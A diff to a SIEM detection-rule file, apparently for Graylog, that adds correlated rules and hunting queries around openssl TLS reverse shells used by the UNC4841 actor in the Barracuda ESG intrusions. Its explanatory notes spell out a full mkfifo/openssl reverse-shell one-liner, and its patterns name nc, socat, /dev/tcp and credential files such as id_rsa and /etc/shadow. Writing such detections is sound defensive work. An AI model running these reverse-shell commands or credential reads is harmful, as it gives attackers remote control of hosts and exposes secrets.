@@ -163,23 +163,58 @@ graylog:
   query: data_process_exec_process_binary:/.*\/[Oo][Pp][Ee][Nn][Ss][Ss][Ll]/ AND data_process_exec_process_arguments:/.*([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*/ AND data_process_exec_process_arguments:/.*[Ss]_[Cc][Ll][Ii][Ee][Nn][Tt].*/ AND data_process_exec_process_arguments:/.*-[Qq][Uu][Ii][Ee][Tt].*/ AND data_process_exec_process_arguments:/.*-[Cc][Oo][Nn][Nn][Ee][Cc][Tt].*/ AND (data_process_exec_process_arguments:/.*:443.*/ OR data_process_exec_process_arguments:/.*:8080.*/)
 
 correlation:
-  # Authored by the correlation engine for review.
+  # Authored per-rule (behaviour-researched) for the correlation engine. Related CoPilot
+  # Searches + telemetry pivots to run around an alert, scoped to its host/user/ip/domain.
+  related_rules:
+  - id: 999c3b12-0a8c-40b6-8e13-dd7d62b75c7a
+    name: Potentially Suspicious Named Pipe Created Via Mkfifo
+    reason: This rule's own description says openssl was used by UNC4841 'as a C2 channel with named pipes'. The openssl s_client -quiet -connect process is the TLS network leg that reads/writes a mkfifo FIFO (mkfifo /tmp/f; cat /tmp/f | /bin/sh | openssl s_client -quiet -connect IP:443 >/tmp/f); a mkfifo exec on the same host is the pipe-creation half of the very backpipe this alert terminates.
+  - id: f6a711f3-d032-4f9e-890b-bbe776236c84
+    name: UNC4841 - Potential SEASPY Execution
+    reason: SEASPY is the backdoor UNC4841 deployed in the same Barracuda ESG intrusions (CVE-2023-2868) this rule's Mandiant reference describes, where openssl named-pipe backpipes served as C2. A SEASPY binary exec on the host confirms the same actor and intrusion behind this openssl C2 channel.
+  - id: 23835beb-ec38-4e74-a5d4-b99af6684e91
+    name: UNC4841 - Download Tar File From Untrusted Direct IP Via Wget
+    reason: 'UNC4841''s documented staging step: wget pulling a .tar from an untrusted direct IP with --no-check-certificate is how the implant/tooling landed on the ESG appliance before this openssl C2 leg ran. A download from this exact campaign on the same host is the precursor that delivered what now calls out over openssl.'
+  - id: 60d050c4-e253-4d9a-b673-5ac100cfddfb
+    name: UNC4841 - Download Compressed Files From Temp.sh Using Wget
+    reason: The other documented UNC4841 staging vector - wget fetching .zip/.rar from temp.sh - stages payloads on the same host in the same Barracuda ESG intrusion. It is a campaign-matched precursor to this openssl exfil/C2 channel.
+  - id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
+    name: Potential Netcat Reverse Shell Execution
+    reason: nc -e <shell> is the plaintext-TCP sibling of this openssl TLS reverse shell; operators who use the openssl backpipe frequently also drop netcat for a second or fallback C2 leg. A netcat reverse shell on the same host is a co-occurring reverse-shell channel from the same hands-on-keyboard session.
+  - id: 880973f3-9708-491c-a77b-2a35a1921158
+    name: Linux Shell Pipe to Shell
+    reason: The openssl reverse-shell one-liner pipes an interactive shell into (and out of) the openssl network leg (cat /tmp/f | /bin/sh -i | openssl ...). This rule fires on that shell-into-shell wrapper, the local half of the same command line that assembles this openssl C2.
+  - id: 818f7b24-0fba-4c49-a073-8b755573b9c7
+    name: Linux Webshell Indicators
+    reason: On the Barracuda ESG, UNC4841's initial code execution came through the exploited web service; a web-server process spawning a shell child is the dominant initial-access precursor whose descendant runs this openssl C2. It explains how the attacker reached the shell that launched openssl.
+  - id: 0cf7a157-8879-41a2-8f55-388dd23746b7
+    name: Linux Recon Indicators
+    reason: This rule explicitly says to investigate commands executed in the temporal vicinity. Once the openssl TLS shell lands an interactive session, the first operator actions are identity/network recon (whoami/id/uname/ip/ss); recon on the same host turns a single openssl connection into a confirmed hands-on-keyboard incident.
+  window: 1h
   enrichment_searches:
-  # Rule-specific telemetry pivots the engine runs around an alert from this rule,
-  # scoped to the alert's host/user/IP within the window (behaviour-targeted, not a sweep).
-    - name: "Other executions of this tool-set on this host (any arguments)"
-      query: 'data_process_exec_process_binary:/.*(\/[Oo][Pp][Ee][Nn][Ss][Ss][Ll])/'
-      pivot_on: [host]
-      window: 2h
-    - name: "Shell / interpreter execution on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Zz][Ss][Hh]|\/[Kk][Ss][Hh]|\/[Aa][Ss][Hh]|\/[Bb][Uu][Ss][Yy][Bb][Oo][Xx])/) OR (data_process_exec_process_binary:/.*(\/[Pp][Yy][Tt][Hh][Oo][Nn]|\/[Pp][Yy][Tt][Hh][Oo][Nn]3|\/[Pp][Ee][Rr][Ll]|\/[Rr][Uu][Bb][Yy]|\/[Pp][Hh][Pp]|\/[Nn][Oo][Dd][Ee]|\/[Ll][Uu][Aa]|\/[Aa][Ww][Kk])/))'
-      pivot_on: [host]
-      window: 1h
-    - name: "Reconnaissance commands on this host"
-      query: 'data_process_exec_process_binary:/.*(\/[Ww][Hh][Oo][Aa][Mm][Ii]|\/[Ii][Dd]|\/[Uu][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee][Cc][Tt][Ll]|\/[Ss][Ss]|\/[Nn][Ee][Tt][Ss][Tt][Aa][Tt]|\/[Ii][Ff][Cc][Oo][Nn][Ff][Ii][Gg]|\/[Aa][Rr][Pp]|\/[Ww]|\/[Ww][Hh][Oo]|\/[Ll][Aa][Ss][Tt]|\/[Ll][Ss][Oo][Ff]|\/[Nn][Mm][Aa][Pp]|\/[Dd][Ii][Gg]|\/[Ff][Ii][Nn][Dd])/'
-      pivot_on: [host]
-      window: 1h
-    - name: "Outbound-transfer / upload tooling on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Cc][Uu][Rr][Ll]|\/[Ww][Gg][Ee][Tt]|\/[Tt][Ff][Tt][Pp])/) OR (data_process_exec_process_binary:/.*(\/[Ss][Cc][Pp]|\/[Rr][Ss][Yy][Nn][Cc]|\/[Rr][Cc][Ll][Oo][Nn][Ee]|\/[Cc][Uu][Rr][Ll])/))'
-      pivot_on: [host]
-      window: 2h
+  # Behaviour-targeted hunts the engine runs around the alert (not a sweep).
+  - name: Named-pipe (mkfifo) creation bridging the openssl backpipe on this host
+    query: data_process_exec_process_binary:/.*\/[Mm][Kk][Ff][Ii][Ff][Oo]/
+    pivot_on:
+    - host
+    window: 1h
+  - name: Other openssl s_client connections to a raw IP (C2 re-dials / any port)
+    query: data_process_exec_process_binary:/.*\/[Oo][Pp][Ee][Nn][Ss][Ss][Ll]/ AND data_process_exec_process_arguments:/.*[Ss]_[Cc][Ll][Ii][Ee][Nn][Tt].*/ AND data_process_exec_process_arguments:/.*([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*/
+    pivot_on:
+    - host
+    window: 4h
+  - name: Access to certificate / private-key / credential material (the exfil objective)
+    query: data_process_exec_process_arguments:/.*(\.[Pp][Ee][Mm]|\.[Kk][Ee][Yy]|\.[Cc][Rr][Tt]|\/[Ee][Tt][Cc]\/[Ss][Ss][Ll]|\/[Ee][Tt][Cc]\/[Pp][Kk][Ii]|[Pp][Rr][Ii][Vv][Aa][Tt][Ee]|[Ii][Dd]_[Rr][Ss][Aa]|\/[Ee][Tt][Cc]\/[Ss][Hh][Aa][Dd][Oo][Ww]).*/
+    pivot_on:
+    - host
+    window: 2h
+  - name: Post-foothold reconnaissance in the temporal vicinity (identity / network discovery)
+    query: data_process_exec_process_binary:/.*(\/[Ww][Hh][Oo][Aa][Mm][Ii]|\/[Ii][Dd]|\/[Uu][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee]|\/[Ii][Pp]|\/[Ss][Ss]|\/[Nn][Ee][Tt][Ss][Tt][Aa][Tt]|\/[Ii][Ff][Cc][Oo][Nn][Ff][Ii][Gg]|\/[Aa][Rr][Pp])/
+    pivot_on:
+    - host
+    window: 1h
+  - name: Alternative reverse-shell network legs on this host (nc/ncat/socat/telnet or bash /dev/tcp)
+    query: (data_process_exec_process_binary:/.*(\/[Nn][Cc]|\/[Nn][Cc][Aa][Tt]|\/[Nn][Ee][Tt][Cc][Aa][Tt]|\/[Ss][Oo][Cc][Aa][Tt]|\/[Tt][Ee][Ll][Nn][Ee][Tt])/) OR (data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Tt][Cc][Pp]\/.*/)
+    pivot_on:
+    - host
+    window: 2h
